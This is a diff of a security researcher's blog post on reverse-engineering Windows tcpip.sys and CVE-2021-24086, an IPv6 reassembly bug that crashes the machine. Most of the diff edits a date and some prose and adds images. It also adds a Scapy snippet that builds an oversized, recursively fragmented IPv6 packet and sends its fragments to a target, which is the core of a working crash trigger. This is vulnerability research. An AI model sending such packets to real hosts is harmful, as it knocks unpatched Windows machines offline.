@@ -1,5 +1,5 @@
 Title: Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)
-Date: 2021-04-09 08:00
+Date: 2021-04-15 08:00
 Tags: tcpip.sys, CVE-2021-24086, Ipv6pReassembleDatagram, fragmentation, recursive-fragmentation
 Authors: Axel "0vercl0k" Souchet
 
@@ -69,6 +69,8 @@ void Ipv6pReassembleDatagram(Packet_t *Packet, Reassembly_t *Reassembly, char Ol
 A fresh NetBufferList (abbreviated NBL) is allocated by `NetioAllocateAndReferenceNetBufferAndNetBufferList` and `NetioRetreatNetBuffer` allocates an MDL of `uint16_t(HeaderAndOptionsLength)`. This integer truncation from `uint32_t` is important.
 
 Once the network buffer has been allocated, `NdisGetDataBuffer` is called to gain access to a contiguous block of data from the fresh network buffer. This time though, `HeaderAndOptionsLength` is not truncated which allows an attacker to trigger a special condition in `NdisGetDataBuffer` to make it fail. This condition is hit when `uint16_t(HeaderAndOptionsLength) != HeaderAndOptionsLength`. When the function fails, it returns NULL and `Ipv6pReassembleDatagram` blindly trusts this pointer and does a memory write, bugchecking the machine. To pull this off, you need to trick the network stack into receiving an IPv6 fragment with a very large amount of headers. Here is what the bugchecks look like:
+
+<center>![trigger](/images/reverse_engineering_tcpip/trigger.gif)</center>
 
 ```text
 KDTARGET: Refreshing KD connection
@@ -814,9 +816,36 @@ After trying and trying I started to think that I might have been headed in the 
 
 All right so I decided to start fresh again. Going back to the big picture, I've studied a bit more the reassembly algorithm, diffed again just in case I missed a clue somewhere, but nothing...
 
-Could I maybe be able to fragment a packet that has a very large header and trick the stack into reassembling the reassembled packet? It honestly felt like a long leap forward, but based on my reverse-engineering effort I didn't really see anything that would prevent that. The idea was blurry but felt like it was worth a shot. How would it really work though?
+Could I maybe be able to fragment a packet that has a very large header and trick the stack into reassembling the reassembled packet? We've seen previously that we could use reassembly as a primitive to stitch fragments together; so instead of trying to send a very large fragment maybe we could break down a large one into smaller ones and have them stitched together in memory. It honestly felt like a long leap forward, but based on my reverse-engineering effort I didn't really see anything that would prevent that. The idea was blurry but felt like it was worth a shot. How would it really work though?
 
-Sitting down for a minute, this is the theory that I came up with. I created a very large fragment that has many headers; enough to trigger the bug assuming I could trigger another reassembly. Then, I fragmented this fragment so that it can be sent to the target without violating the MTU. The reassembly happens and `tcpip.sys` builds this huge reassembled fragment in memory; that's great but I didn't think it would work. Here is what it looks like in WinDbg:
+Sitting down for a minute, this is the theory that I came up with. I created a very large fragment that has many headers; enough to trigger the bug assuming I could trigger another reassembly. Then, I fragmented this fragment so that it can be sent to the target without violating the MTU.
+
+```python
+reassembled_pkt = IPv6ExtHdrDestOpt(options = [
+        PadN(optdata=('a'*0xff)),
+        PadN(optdata=('b'*0xff)),
+        PadN(optdata=('c'*0xff)),
+        PadN(optdata=('d'*0xff)),
+        PadN(optdata=('e'*0xff)),
+        PadN(optdata=('f'*0xff)),
+        PadN(optdata=('0'*0xff)),
+    ]) \
+    # ....
+    / IPv6ExtHdrDestOpt(options = [
+        PadN(optdata=('a'*0xff)),
+        PadN(optdata=('b'*0xa0)),
+    ]) \
+    / IPv6ExtHdrFragment(
+        id = second_pkt_id, m = 1,
+        nh = 17, offset = 0
+    ) \
+    / UDP(dport = 31337, sport = 31337, chksum=0x7e7f)
+
+reassembled_pkt = bytes(reassembled_pkt)
+frags = frag6(args.target, frag_id, reassembled_pkt, 60)
+```
+
+The reassembly happens and `tcpip.sys` builds this huge reassembled fragment in memory; that's great as I didn't think it would work. Here is what it looks like in WinDbg:
 
 ```text
 kd> bp tcpip+01ADF71 ".echo Reassembled NB; r @r14;"
@@ -1027,6 +1056,8 @@ kd> kc
 ```
 
 Incredible! We managed to implement the recursive fragmentation idea we discussed. Wow, I really didn't think it would actually work. Morale of the day: don't leave any rocks unturned, follow your intuitions and reach the state of no unknowns.
+
+<center>![trigger](/images/reverse_engineering_tcpip/trigger.gif)</center>
 
 # Conclusion
 
